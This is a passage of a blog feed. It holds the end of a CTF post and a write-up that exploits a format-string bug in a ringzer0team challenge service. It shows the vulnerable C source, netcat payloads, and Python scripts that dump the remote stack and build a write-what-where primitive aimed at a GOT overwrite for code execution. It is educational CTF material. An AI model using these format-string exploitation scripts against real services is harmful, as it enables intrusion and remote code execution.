</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/yvrctf/sushi-100<span class="nv">$ </span>python ./sushi.py
</span><span class='line'><span class="o">[</span>~<span class="o">]</span> stack addr: 0x7fffb3fc0480
</span><span class='line'>Sorry, <span class="nv">$0</span>.49 is not enough.
</span><span class='line'>cat flag.txt
</span><span class='line'>flag<span class="o">{</span>I_l3ft_my_wallet_in_#irc<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/"/>
    <updated>2015-02-22T13:01:22+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution</id>
    <content type="html"><![CDATA[<p>You might remember my first <a href="https://staringintodevnull.blogspot.nl/2014/09/maximum-overkill-rop-exploit-for.html">Maximum Overkill writeup</a>, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I completed another over-the-top, why-would-you-even-do-this exploit for a CTF challenge and figured I&rsquo;d shared it.</p>

<!-- more -->


<p><a href="http://ringzer0team.com">ringzer0team</a> has a very nice, long-running CTF going on. I already did the <a href="https://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">shellcoding challenges</a>, which I really enjoyed. I completed the fourth pwnable level on an evening, which simply involved dumping the stack via a format string bug and grabbing a password. I thought to myself: &ldquo;would I be able to get a shell using this format string vulnerability?&rdquo;</p>

<p>This writeup is made with Hindsight<sup>tm</sup> and as such, I have not included all the paths that led nowhere or the mistakes I have made. I have tried to include the thought-process as much as possible.</p>

<h2>Dumping the Stack</h2>

<p>OK, onwards! One catch is that the remote box is a 64-bit system and I don&rsquo;t have the binary itself. We do have a snippet of source code and the ability to dump the stack from within a vulnerable <code>sprintf</code> call:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">response</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">response</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">cleanBuffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="n">strncpy</span><span class="p">(</span><span class="n">cleanBuffer</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="n">test</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;AAAABBBBCCCC&quot;</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">flag</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">cleanBuffer</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="s">&quot;Here&#39;s your flag FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXX.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">cleanBuffer</span><span class="p">);</span> <span class="c1">// &lt;-- we have a format string vulnerability here</span>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="s">&quot;%s is a wrong password.</span><span class="se">\n\n</span><span class="s">Password:&quot;</span><span class="p">,</span> <span class="n">response</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc pwn01.ringzer0team.com 13377
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:%lx-%lx-%lx-%lx-%lx-%lx-
</span><span class='line'>17f4880-25-0-80-7fffd6e74448-200000000- is a wrong password.
</span></code></pre></td></tr></table></div></figure>


<p>The fifth address jumps out. It is either a stack address, or a <code>libc</code> address. Let&rsquo;s see what it points to:</p>

<p><img src="http://barrebas.github.io/assets/maximum-overkill-two/00-what-does-the-stack-contain.png" alt="" /></p>

<p>I tried to write to it using <code>%n</code>, which didn&rsquo;t crash the remote binary. This meant that it most likely is a stack address! I wrote a small python script to dump the stack. I noticed I could not re-use the connection I made via python sockets, so I had to reconnect for every format string I sent.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="n">i</span><span class="p">,</span> <span class="n">addr</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">700</span><span class="p">):</span>
</span><span class='line'>  <span class="n">grab</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This indeed dumped out the data on the stack. I found where the fifth parameter was pointing to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">...</span><span class="n">snip</span><span class="o">...</span>
</span><span class='line'><span class="mi">633</span> <span class="mi">7</span><span class="n">fffeecd9c28</span>
</span><span class='line'><span class="mi">634</span> <span class="mi">1</span><span class="n">c</span>
</span><span class='line'><span class="mi">635</span> <span class="mi">2</span>
</span><span class='line'><span class="mi">636</span> <span class="mi">7</span><span class="n">fff00000042</span>
</span><span class='line'><span class="mi">637</span> <span class="mi">7</span><span class="n">fffeecdaf65</span>
</span><span class='line'><span class="mi">638</span> <span class="mi">0</span>
</span><span class='line'><span class="o">...</span><span class="n">snip</span><span class="o">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>See, it points to the 636th parameter, because the lower 32 bits contain the value I&rsquo;ve just written with <code>%n</code>! Pretty neat. So with <code>%&lt;parameter number&gt;$lx</code> I could view what that particular parameter contained, and with <code>%&lt;parameter number&gt;$s</code> I could see what it pointed to (provided it was pointing to a valid memory address!) I wondered where the 636th parameter pointed to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc pwn01.ringzer0team.com 13377
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$lx</span>
</span><span class='line'>7fff3ca49f51 is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$s</span>
</span><span class='line'>/home/crackme/fs_64 is a wrong password.
</span></code></pre></td></tr></table></div></figure>


<p>Interesting! I figured I could use this to my advantage&hellip; The 5th parameter points to the 636th, which itself points to somewhere on the stack. I could write to the address contained in the 636th parameter, like so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc pwn01.ringzer0team.com 13377
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$lx</span>
</span><span class='line'>7fff3ca49f51 is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$s</span>
</span><span class='line'>/home/crackme/fs_64 is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%66c%636<span class="nv">$hhn</span>
</span><span class='line'>                                                                 � is a wrong password.
</span><span class='line'>
</span><span class='line'>Password:%636<span class="nv">$s</span>
</span><span class='line'>Bhome/crackme/fs_64 is a wrong password.
</span></code></pre></td></tr></table></div></figure>


<h2>Write what where now?</h2>

<p>But more importantly, I could write <strong>to</strong> the 636th parameter <em>via</em> the fifth, giving me a write-what-where primitive! So, for instance, to write to <code>0x7fff3ca49f00</code>, I&rsquo;d first do <code>%256c%5$hhn</code>. This will overwrite the last byte of the 636th parameter with a NULL. Then, I&rsquo;d write to the address using <code>%66c%636$hhn</code>. Finally, I&rsquo;d like to know where this byte was written, which turned out to be the easiest: we have the address of <code>636</code>, and we have another address <code>0x7fff3ca49f00</code>. Subtracting the first from the latter and dividing by 8 gives the format string parameter we need to access the written byte directly! I wrote a simple proof-of-concept for this.</p>

<p>The following python code abuses the format string vulnerability to write out &lsquo;BAS&rsquo; to an area on the stack. We can access it indirectly with <code>%636$s</code> and directly using <code>%&lt;parameter&gt;$lx</code>, given the proper format parameter. The funny thing that I noticed was that my changes to the stack were persistent, even after reconnecting. This meant that the binary did not fork(), but handled each request by itself. This is interesting for later&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_directly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_indirectly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ugly workaround, only grab 8 bytes. will fix this later!</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_byte_value_via</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$hhn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this will write out &#39;BAS&#39;,0 to the scratch area!</span>
</span><span class='line'><span class="c"># update the pointer</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="c"># write a byte to the scratch area</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="p">))</span>
</span><span class='line'><span class="c"># update the pointer</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'><span class="c"># write a byte to the scratch area</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;A&#39;</span><span class="p">))</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;S&#39;</span><span class="p">))</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'><span class="c"># write out a NULL byte first writing out 256 bytes (which wraps to 0x00)</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># reset the pointer</span>
</span><span class='line'><span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># CAN ADDRESS IT DIRECTLY!!</span>
</span><span class='line'><span class="n">scratch_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">scratch_addr</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5<span class="nv">$ </span>python sploit1.py
</span><span class='line'>parameter <span class="m">5</span> points to:  0x7fff3ca480d8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fff3ca49f51
</span><span class='line'>scratch contains:  0x534142
</span><span class='line'>scratch is parameter 1601
</span><span class='line'>scratch contains:  0x53414200
</span></code></pre></td></tr></table></div></figure>


<p>This is great, because I have a write-what-where primitive know! My first thought was to overwrite a GOT entry with <code>system()</code>. For that to work, I needed several things: the address of system() in libc, and thus which version of libc I was dealing with; and the address of a GOT pointer which I could overwrite. First things first, I wrote a dumper script to start dumping the binary.</p>

<h2>Slam Dump </h2>

<p>Using the <code>write-an-address-to-scratch-space</code> primitive, I started dumping the binary. I added a function to dump from a specific memory address and I verified it by grabbing the bytes at <code>0x400000</code>. These should correspond to the magic bytes of an ELF header.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
